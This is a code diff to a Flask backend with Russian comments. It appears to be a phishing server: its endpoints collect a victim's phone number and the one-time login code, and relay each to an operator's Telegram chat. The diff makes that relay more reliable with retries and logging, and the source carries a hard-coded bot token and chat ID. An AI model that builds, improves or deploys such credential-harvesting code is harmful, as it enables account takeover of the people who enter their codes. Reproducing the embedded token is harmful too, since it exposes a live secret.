@@ -3,35 +3,43 @@ from flask_cors import CORS
 import uuid
 import os
 import requests
+import time
 from datetime import datetime
 
 app = Flask(__name__, static_folder='.')
 CORS(app)
 
-# Временное хранилище для номеров (в памяти)
 pending_requests = {}
 
-# ================== НАСТРОЙКИ TELEGRAM ==================
-# ВСТАВЬ СЮДА НОВЫЙ ТОКЕН (после того как перевыпустишь его в @BotFather)
+# ================== НАСТРОЙКИ ==================
 BOT_TOKEN = "8952942696:AAFpjbsN70_UpNJFgLXaR_xWSgE7mFn7xc8" 
-# ТВОЙ ID (если это группа, оставь минус в начале)
 YOUR_CHAT_ID = "-1004430177333" 
-# ========================================================
+# ================================================
 
 def send_to_telegram(text):
-    """Отправляет сообщение в Telegram"""
+    """Отправляет сообщение в Telegram с 3 попытками"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": YOUR_CHAT_ID,
         "text": text,
         "parse_mode": "HTML"
     }
-    try:
-        response = requests.post(url, json=payload)
-        if response.status_code != 200:
-            print(f"[-] Ошибка Telegram: {response.text}")
-    except Exception as e:
-        print(f"[-] Ошибка сети при отправке в TG: {e}")
+    
+    for attempt in range(3):
+        try:
+            response = requests.post(url, json=payload, timeout=10)
+            if response.status_code == 200:
+                print(f"[+] Успешно отправлено в TG: {text}")
+                return True
+            else:
+                print(f"[-] Попытка {attempt+1}. Ошибка TG: {response.text}")
+        except Exception as e:
+            print(f"[-] Попытка {attempt+1}. Ошибка сети: {e}")
+        
+        time.sleep(1) # Пауза перед следующей попыткой
+        
+    print("[!] Не удалось отправить сообщение в Telegram после 3 попыток.")
+    return False
 
 @app.route('/')
 def index():
@@ -46,8 +54,9 @@ def api_send_code():
     data = request.json
     phone_number = data.get('phone')
     
+    print(f"\n[!] Получен запрос с номером: {phone_number}")
+    
     msg = f"📱 <b>Введен номер:</b> {phone_number}"
-    print(f"\n[+] {msg}")
     send_to_telegram(msg)
     
     request_id = str(uuid.uuid4())
@@ -61,8 +70,9 @@ def api_verify_code():
     request_id = data.get('request_id')
     user_code = data.get('code')
     
+    print(f"\n[!] Получен запрос с кодом: {user_code}")
+    
     msg = f"🔑 <b>Введен код:</b> {user_code}"
-    print(f"\n[+] {msg}")
     send_to_telegram(msg)
     
     if request_id in pending_requests:
@@ -74,8 +84,5 @@ def api_verify_code():
         return jsonify({"success": True})
     else:
         return jsonify({"success": False, "error": "Сессия истекла"})
-
-# Файл app.run удален, так как Render запускает его через gunicorn
-
 # ВАЖНО: УДАЛЕНА СТРОКА app.run(...)
 # Render сам запустит приложение через gunicorn
